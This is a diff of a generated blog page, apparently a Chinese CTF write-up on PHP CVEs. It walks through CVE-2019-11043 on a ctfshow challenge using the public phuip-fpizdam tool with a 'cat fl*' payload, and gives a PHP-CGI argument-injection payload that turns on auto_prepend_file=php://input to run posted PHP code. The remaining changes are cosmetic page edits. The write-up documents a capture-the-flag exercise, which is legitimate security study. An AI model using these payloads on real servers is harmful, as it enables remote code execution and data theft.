@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      6
        分钟
     </span>
   
@@ -245,20 +238,26 @@
             <!-- SEO header -->
             <h1 style="display: none">PHP-CVE</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：3 个月前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h2><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。<br><code>ctfshow web311</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101645864.png" srcset="/img/loading.gif"></p>
 <p>抓包发现</p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101645192.png" srcset="/img/loading.gif"><br>搜一下<br><a target="_blank" rel="noopener" href="https://blog.qualys.com/product-tech/2019/10/30/php-remote-code-execution-vulnerability-cve-2019-11043">PHP Remote Code Execution Vulnerability (CVE-2019-11043)</a></p>
 <p>具体利用：<br>工具：<a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a><br><a target="_blank" rel="noopener" href="https://www.topgoer.com/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/go%E7%9A%84%E5%AE%89%E8%A3%85.html">需要安装go环境</a></p>
-<pre><code>git clone https://github.com/neex/phuip-fpizdam.git
+<div class="hljs"><pre><code>git clone https://github.com/neex/phuip-fpizdam.git
 cd phuip-fpizdam
-go get -v &amp;&amp; go build</code></pre>
+go get -v &amp;&amp; go build</code></pre></div>
 <p><code>go get</code>可能会<code>time out</code><br>执行如下命令：</p>
-<pre><code>go env -w GO111MODULE=on
+<div class="hljs"><pre><code>go env -w GO111MODULE=on
 go env -w GOPROXY=https://goproxy.io,direct
 
 # 设置不走 proxy 的私有仓库，多个用逗号相隔（可选）
-go env -w GOPRIVATE=*.gitlab.com</code></pre>
+go env -w GOPRIVATE=*.gitlab.com</code></pre></div>
 <p>然后<br><code>go run . &quot;http://5882cf97-4bf8-46e9-a282-e212fc598c19.challenge.ctf.show/index.php&quot;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101650720.png" srcset="/img/loading.gif"></p>
 <p>payload:<code>?a=cat fl*</code><br>多刷新几次就出来了</p>
 <h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><p>PHP imap 远程命令执行漏洞（CVE-2018-19518）</p>
@@ -279,8 +278,8 @@ go env -w GOPRIVATE=*.gitlab.com</code></pre>
 </ul>
 <p>经过使用-d指定auto_prepend_file来制造任意文件包含漏洞，执行任意代码</p>
 <p>payload：</p>
-<pre><code>index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
-post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre>
+<div class="hljs"><pre><code>index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
+post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre></div>
 <hr>
 <p>还有一个写session文件的和一个xdebug的，没有复现成功<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120594729">MORE</a></p>
 
@@ -418,7 +417,7 @@ post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre>
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -444,8 +443,6 @@ post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre>
 
 
 
-  
-    
   
 
 
